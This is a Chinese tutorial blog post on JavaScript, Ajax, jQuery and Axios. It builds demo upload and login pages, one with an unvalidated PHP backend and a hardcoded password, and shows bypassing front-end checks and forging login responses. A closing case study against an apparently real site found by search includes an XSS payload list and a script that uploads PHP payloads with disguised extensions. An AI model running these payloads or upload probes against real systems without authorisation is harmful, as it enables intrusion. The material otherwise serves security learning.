---
title: JS应用&原生代码&Ajax技术&JQuery库&Axios库&前端校验&安全结合
published: 2026-02-14 21:00:00
description: js的基础知识（变量、函数等）、以及ajax技术，jQuery/axios异步请求、文件上传与登录验证案例，分析前端过滤绕过，响应篡改的漏洞与手法，还有一则实战案例。
tags: [Web开发,JS]
category: 网络安全
draft: false
---

# 知识点

1. 安全开发-原生JS-语法模型概念
2. 安全开发-Ajax技术-JQuery&Axios
3. 安全开发-Ajax应用-文件上传&用户登录

JavaScript被广泛用于Web应用开发，常用来为网页添加各式各样的动态功能,为用户提供更流畅美观的浏览效果。嵌入动态文本于HTML页面；对浏览器事件做出响应，读写HTML元素，在数据被提交到服务器之前验证数据；检测访客的浏览器信息；控制用户凭据，包括创建和修改等。

## 异步请求

异步请求（Asynchronous Request）是指浏览器在不刷新页面的情况下，通过 JavaScript 后台向服务器发送请求并获取数据的技术。本文涉及的异步请求知识点包括：原生 XMLHttpRequest 通过 `open()` 方法开启异步通信，配合 `onreadystatechange` 监听状态变化；jQuery 使用 `$.ajax()` 简化异步操作，配置 `method`、`url`、`success` 回调处理响应；Axios 基于 Promise 封装异步请求，通过 `.then()` 链式处理成功回调。在文件上传场景中，异步请求实现无刷新提交文件并实时验证类型；在登录验证场景中，异步提交凭据后根据返回的 JSON 数据动态判断登录状态，无需跳转页面。这些技术的核心优势是局部刷新与后台通信，但也带来前端绕过风险——如禁用 JavaScript、修改响应包、本地篡改过滤代码等。

## 加密使用js的原因

| 环节              | 说明                                                  |
| ----------------- | ----------------------------------------------------- |
| **JS 加密的本质** | 加密逻辑在**浏览器端**执行，而非服务器                |
| **目的**          | 减少服务器计算压力、防中间人明文传输、增加逆向难度    |
| **请求流向**      | 浏览器 JS 加密 → **仍发送到服务器** → 服务器解密/验证 |

# 安全结合

1. 发现更多的有利用价值的信息（URL、域名、路径等等）

   测试站、后台路径、未公开的路径、api地址等等

2. 发现敏感信息（硬编码的帐号、pass、API密钥、注释等等）

   硬编码帐号可登录、测试帐号可被登录、密钥泄露、注释中开发信息等等

3. 发现危险的代码（eval、dangerouslySetInnerHTML等等）

   URL跳转，XSS跨站、模版注入（SSTI）等

4. 了解网站的逻辑校验功能

   前端检测，加密逆向，数据走向等

## 学习文档

1. 原生JS教程：https://www.w3school.com.cn/js/index.asp
2. jQuery库教程：https://www.w3school.com.cn/jquery/index.asp
3. Axios库教程：https://www.axios-http.cn/docs/intro

# 语法模型概念

## 变量

### 普通变量

```js
var x = 7;
var y = 8;
var z = x+y;
```

### let变量

块作用域变量

```js
var carname = "porsche";
// 此处的代码可以使用carname
function myfunction(){
    // 此处的代码可以使用carname
}
```

### const变量

不能重新赋值

```js
const pi = 3.141592653589793;
pi = 3.14 // 会报错
pi = pi + 10; // 也会报错
```

## 函数

```js
function myfunction(p1,p2){
    return p1*p2;
}
```

## 运算

```js
var x = 7;
var y = 8;
var z = x+y;
```

## 事件

| 事件        | 描述                       |
| ----------- | -------------------------- |
| onchange    | HTML 元素已被改变          |
| onclick     | 用户点击了HTML元素         |
| onmouseover | 用户把鼠标移动到HTML元素上 |
| onmouseout  | 用户把鼠标移开HTML元素     |
| onkeydown   | 用户按下键盘按键           |
| onload      | 浏览器已经完成页面加载     |

## 比较

比较运算符，这里给定`x=5`

| 运算符 | 描述                 | 比较      | 返回  |
| ------ | -------------------- | --------- | ----- |
| ==     | 等于                 | x == 8    | false |
|        |                      | x == 5    | true  |
|        |                      | x == "5"  | true  |
| ===    | 值相等并且类型相等   | x === 5   | true  |
|        |                      | x === "5" | false |
| !=     | 不相等               | x != 8    | true  |
| !==    | 值不相等或类型不相等 | x !== 5   | false |
|        |                      | x !== "5" | true  |
|        |                      | x !== 8   | true  |
| >      | 大于                 | x > 8     | false |
| <      | 小于                 | x < 8     | true  |
| >=     | 大于等于             | x >= 8    | false |
| <=     | 小于等于             | x <= 8    | true  |

## Demo

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    
</body>

<script type="text/javascript">
    const a = 1;
    const abc = 111;
    document.writeln(a);// 会在页面打印出来
    console.log(abc);// 会在控制台打印出来

</script>
</html>
```

# Ajax技术

概念：Asynchronous JavaScript And XML：异步的 JavaScript 和 XML

AJAX作用：

1. 数据交换：通过AJAX可给服务器发送请求，并获取服务器响应的数据
2. 后台发送：浏览器的请求是后台js发送给服务器的，js会创建单独的线程发送异步请求，这个线程不会影响浏览器的线程运行。
3. 局部刷新：浏览器接收到结果以后进行页面局部刷新

JS-AJAX知识点：

1. 变量，函数，运算，事件等
2. 引用库，Ajax，JQuery，Axios等

# 原生代码案例

### onreadystatechange 属性

`readyState` 属性存留 XMLHttpRequest 的状态。

`onreadystatechange` 属性定义当 readyState 发生变化时执行的函数。

`status` 属性和 `statusText` 属性存有 XMLHttpRequest 对象的状态。

| 属性               | 描述                                                         |
| :----------------- | :----------------------------------------------------------- |
| onreadystatechange | 定义了当 readyState 属性发生改变时所调用的函数。             |
| readyState         | 保存了 XMLHttpRequest 的状态。0: 请求未初始化1: 服务器连接已建立2: 请求已接收3: 正在处理请求4: 请求已完成且响应已就绪 |
| status             | 200: "OK"403: "Forbidden"404: "Page not found"如需完整列表，请访问 [Http 消息参考手册](https://www.w3school.com.cn/tags/html_ref_httpmessages.asp) |
| statusText         | 返回状态文本（例如 "OK" 或 "Not Found"）                     |

*每当* readyState 发生变化时就会调用 onreadystatechange 函数。

当 `readyState` 为 `4`，`status` 为 `200` 时，响应就绪：

### 实例

```js
<script type="text/javascript">
    var xhttp = new XMLHttpRequest();
    xhttp.open("GET", "1.txt", true);
    xhttp.send(); 
    xhttp.onreadystatechange = function(){
        if (this.readyState == 4 && this.status == 200) {
            console.log(xhttp.responseText);
        }
    }
```

![image-20260214105346530](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260214105346530.png)

# 引用库-JQuery

## 本地引用

需要自行下载到本地，之后引用即可，路径根据自己的需求。

```html
<script src="jquery-x.x.x.min.js"></script>
```

通过浏览器的网络请求，根据ip显示可以看到是否本地。

## 远程在线调用

直接复制路径，需要注意与目标服务器网络连接情况。

```html
<script src="https://code.bdstatic.com/npm/jquery@3.7.1/dist/jquery.min.js"></script>
```

调用后的域名显示是对方的地址。

## 示例代码

```html
<script src="https://code.bdstatic.com/npm/jquery@3.7.1/dist/jquery.min.js"></script>
<script>
	$.ajax({
        method: "GET",
        url: "1.txt",
        dataType: "text",
        success: function(response){
            console.log(response);
        }     
    })
</script>
```

# 引用库-Axios

一般node.js和vue.js大部分都搭配它

## 本地引用

同上

```html
<script src="axios.min.js"></script>
```

## 远程在线调用

同上

```html
<script src="https://cdn.jsdelivr.net.cn/npm/axios/dist/axios.min.js"></script>
```

## 示例代码

```html
<script src="https://cdn.jsdelivr.net.cn/npm/axios/dist/axios.min.js"></script>
<script>
	axios({
        method: "GET",
        url: "1.txt",
        dataType: "text",
    }).then(function(response){
        console.log(response.data);
    })
</script>
```

# 文件上传案例

## 文件上传

1. 布置前端页面

   ```html
   <form action="file.php" method="post" enctype="application/x-www-form-urlencoded">
           选择文件：
           <input type="file" name="file_upload" onchange="checkFile(this.value)">
           <input type="submit" value="上传">
   </form>
   ```

2. JS获取提交数据

3. JS对上传格式判断

   获取提交数据并判断

   ```js
   <script>
   function checkFile(filename){
       // 定义允许上传的文件扩展名白名单
       var exts = ['png','jpg','jpeg','gif'];
       
       // 获取文件名中最后一个点号的位置
       var index = filename.lastIndexOf(".");
       
       // 如果没有点号，说明文件没有扩展名
       if(index == -1){
           alert("非法文件！");  // 提示非法
           window.location.replace("upload.html");  // 跳转回上传页面
           return;  // 结束函数执行
       }
       
       // 从点号后面截取扩展名，并转换为小写（防止大写扩展名如.JPG）
       var ext = filename.substr(index+1).toLowerCase();
       
       // 使用数组的includes方法检查扩展名是否在白名单中
       // 如果扩展名在exts数组中存在，返回true，否则返回false
       if(exts.includes(ext)){
           alert("文件上传成功！");  // 文件合法，提示成功
           // 这里可以继续执行上传操作
       }else{
           alert("非法文件！");  // 文件不合法，提示非法
           window.location.replace("upload.html");  // 跳转回上传页面
       }
   }
   </script>
   ```

4. 后端对上传数据处理（无过滤验证）

   ```php
   <?php
   
   $name = $_FILES['file_upload']['name'];
   $type = $_FILES['file_upload']['type'];
   $size = $_FILES['file_upload']['size'];
   $tmp_name = $_FILES['file_upload']['tmp_name'];
   $error = $_FILES['file_upload']['error'];
   
   echo $name."<br>";
   echo $type."<br>";
   echo $size."<br>";
   echo $tmp_name."<br>";
   echo $error."<br>";
   ```

前端JS进行后缀过滤，后端PHP进行上传处理

## axios写法

```js
<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
<script>
    document.querySelector('button').addEventListener('click', function() {
    var file = document.querySelector('input[type="file"]').files[0];
    
    if (!file) {
        alert('请选择文件');
        return;
    }
    
    // 白名单：只允许图片类型
    var allowedTypes = ['image/png', 'image/jpeg', 'image/jpg', 'image/gif'];
    
    // 验证MIME类型
    if (!allowedTypes.includes(file.type)) {
        alert('只允许上传图片文件（PNG、JPG、JPEG、GIF）');
        return;
    }
    
    // 上传
    var formData = new FormData();
    formData.append('file_upload', file);
    
    axios.post('file.php', formData, {
        headers: {'Content-Type': 'multipart/form-data'}
    })
    .then(res => alert('上传成功'))
    .catch(err => alert('上传失败'));
})
</script>
```

## 安全问题

1. 过滤代码能看到分析绕过 
2. 禁用JS或删除过滤代码绕过

可以直接修改js代码，比如修改扩展名，或者删除onclick，如果不生效，

把源代码保存到本地之后，表单提交地址改为对方的，之后解除限制类型，进行上传即可。

![image-20260214203108337](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260214203108337.png)

![image-20260214203513297](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260214203513297.png)

# 登录验证案例

## 登录验证

1. 布置前端页面

   > **使用JavaScript通过class获取用户名和密码输入框的值，并处理按钮的登录逻辑。**

   ```html
    <form id="loginForm" onsubmit="return fakeLogin(event)">
           <div class="form-group">
               <label for="username">用户名 / 邮箱</label>
               <input type="text" id="username" class="input-field" placeholder="your@email.com 或 用户名" class="user">
           </div>
   
           <div class="form-group">
               <label for="password">密码</label>
               <input type="password" id="password" class="input-field" placeholder="··········" class="pass">
           </div>
   
           <div class="row-flex">
               <label class="remember">
                   <input type="checkbox" checked> 记住我
               </label>
               <a href="#" class="forgot-link" onclick="return false;">忘记密码?</a>
           </div>
   
           <!-- 显示简单的验证反馈 (无后端) -->
           <div id="loginMessage" class="message"></div>
   
           <button type="submit" class="login-btn">登 录</button>
       </form>
   ```

2. 获取登录事件

   参考https://www.w3school.com.cn/jquery/jquery_events.asp，jQuery 事件函数处理

   ```js
   $("button").click(function() {  // some code... } )
   ```

3. 配置Ajax请求

   ```js
       $('button').click(function(){
           $.ajax({
           url: "login.php",
           method: "POST",
           // res 是一个字符串，不是对象。需要先解析JSON。
           dataType: "json",
           data:{
               username: $('.user').val(),
               password: $('.pass').val()
           },
           success:function(res)
           {
               // 这里输出的是字符串: {"msg":"ok","infoCode":1}
               console.log(res);
               if(res['infoCode'] == 1){
                   alert('登录成功!');
               }else{
                   alert('登录失败!');
               }
           }
           })
       })
   ```

4. 后端代码验证

   ```php
   <?php
   
   $user = $_POST['username'];
   $pass = $_POST['password'];
   
   $success = array('msg'=>'ok');
   if($user == 'c3' && $pass == 123456){
       $success['infoCode'] = 1;
   }else{
       $success['infoCode'] = 0;
   }
   
   echo json_encode($success);
   ```

5. 成功回调判断

   ```html
   控制台中显示{"msg":"ok","infoCode":1}，同时弹出登录成功
   ```

后端PHP进行帐号判断，前端JS进行登录处理

## axios写法

```js
<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
<script>
document.querySelector('.login-btn').addEventListener('click', function(e) {
    e.preventDefault();
    
    // 使用 URLSearchParams 发送表单格式的数据
    var params = new URLSearchParams();
    params.append('username', document.querySelector('.user').value);
    params.append('password', document.querySelector('.pass').value);
    
    axios.post('login.php', params)
    .then(function(res) {
        if(res.data.infoCode == 1) {
            alert('登录成功!');
        } else {
            alert('登录失败!');
        }
    })
    .catch(function(error) {
        alert('请求失败');
    });
});
</script>
```

## 安全问题

1. 过滤代码能看到分析绕过 
2. 禁用JS或修改返回分析绕过

在源代码中，js判断infoCode值为1，即可登录成功，那么我们使用burp抓包修改响应值为1就达到了绕过效果。

```js
if(res['infoCode'] == 1){
    alert('登录成功!');
}else{
    alert('登录失败!');
}
```

![image-20260214120016867](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260214120016867.png)

# 测试案例

## JS代码分析验证逻辑

网络空间：body="checkfile"等等，自由发挥。

首先观察有没有存在文件校验漏洞：

![image-20260214205652929](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260214205652929.png)

### xss漏洞

这里发现可以通过上传接口返回恶意的HTML/JavaScript代码。

![image-20260214210401679](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260214210401679.png)

1. 创建一个正常的Excel文件（例如 `test.xlsx`）

2. 使用Burp Suite或浏览器开发者工具拦截上传请求

3. 修改服务器返回的响应内容，插入XSS payload：

   ```
   Y:<script>alert('XSS漏洞测试')</script>
   ```

![image-20260214210004019](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260214210004019.png)

这时候返回正题，看看有没有存在文件上传漏洞：

![image-20260214210541701](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260214210541701.png)

php代码如下：

```php
<?php
// 返回各种XSS payload进行测试
header('Content-Type: text/html');

$payloads = [
    '<script>alert(document.cookie)</script>',
    '<img src=x onerror="alert(\'XSS\')">',
    '<svg/onload=alert("XSS")>',
    'javascript:alert("XSS")',
    '<body onload=alert("XSS")>',
    '<iframe src="javascript:alert(`XSS`)"></iframe>',
    '<details open ontoggle=alert("XSS")>',
    '<input onfocus=alert("XSS") autofocus>',
    '<select autofocus onchange=alert("XSS")><option>X</option></select>'
];

// 随机选择一个payload
$payload = $payloads[array_rand($payloads)];

// 返回带有Y:前缀的响应（符合原代码的解析逻辑）
echo 'Y:' . $payload;
?>
```

修改后缀名为xls或者xlsx进行提交发现：

![image-20260214210937084](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260214210937084.png)

```
Whitelabel Error Page - Spring Boot默认错误页面
这表明后端可能是Java/Spring Boot应用
500 Internal Server Error - 服务器处理时发生内部错误
```

服务器可能没有直接执行上传的PHP文件，而是因为文件格式不正确或其他原因导致错误。

于是尝试修改文件后缀，使用自动化脚本：

```python
# direct_test.py
import requests

def test_upload(filename, content_type, payload):
    url = "http://ip:port/addExel/upload"
    
    files = {
        'fileInput': (filename, payload, content_type),
        'theurl': (None, 'test')
    }
    
    try:
        print(f"[*] 正在测试: {filename}")
        response = requests.post(url, files=files, timeout=10)
        print(f"    状态码: {response.status_code}")
        print(f"    响应内容: {response.text[:200]}")
        print("-" * 50)
        return response
    except Exception as e:
        print(f"[!] 错误: {e}")
        return None

# PHP测试payload
php_payloads = [
    '<?php echo "Y:test"; ?>',
    '<?php phpinfo(); ?>',
    '<?php echo "Y:" . $_SERVER["SERVER_SOFTWARE"]; ?>',
]

# 测试各种文件名
test_cases = [
    ('test.php', 'application/x-php'),
    ('test.php.xlsx', 'application/vnd.ms-excel'),
    ('test.php.xls', 'application/vnd.ms-excel'),
    ('test.xlsx', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'),
    ('test.php.jpg', 'image/jpeg'),
    ('test.php.png', 'image/png'),
    ('test.phtml', 'text/html'),
    ('test.php5', 'application/x-httpd-php'),
    ('test.php4', 'application/x-httpd-php'),
    ('test.php3', 'application/x-httpd-php'),
    ('test.php7', 'application/x-httpd-php'),
]

for filename, content_type in test_cases:
    test_upload(filename, content_type, php_payloads[0])
```

![image-20260214213148499](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260214213148499.png)

后续使用抓包，还有本地修改源代码都无效，遂放弃。
